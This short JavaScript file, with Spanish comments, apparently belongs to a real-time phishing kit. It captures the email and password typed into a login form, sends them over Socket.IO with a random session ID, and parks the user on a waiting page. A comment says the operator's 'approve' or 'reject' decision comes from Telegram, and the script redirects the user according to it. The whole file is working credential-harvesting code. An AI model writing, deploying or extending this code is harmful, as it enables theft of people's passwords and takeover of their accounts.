// Conectar con el servidor via Socket.IO
const socket = io();

// Generar sessionId aleatorio y guardarlo
const sessionId = Math.random().toString(36).substring(2, 15);
localStorage.setItem('sessionId', sessionId);

// Obtener el formulario
const form = document.querySelector("form");

// Escuchar el envío del formulario
form.addEventListener("submit", function (event) {
  event.preventDefault();

  const correo = document.getElementById("correo").value;
  const contrasena = document.getElementById("contrasena").value;

  // Enviar datos al servidor vía WebSocket
  socket.emit("dataForm", { correo, contrasena, sessionId });

  // Redirigir al usuario a la página de espera
  window.location.href = "/opciones.html";
});

// Escuchar la respuesta del servidor (viene desde Telegram)
socket.on("respuesta", (decision) => {
  if (decision === "aprobado") {
    window.location.href = "/bienvenido.html";
  } else if (decision === "rechazado") {
    window.location.href = "/denegado.html";
  } else {
    alert("Respuesta desconocida del servidor.");
  }
});
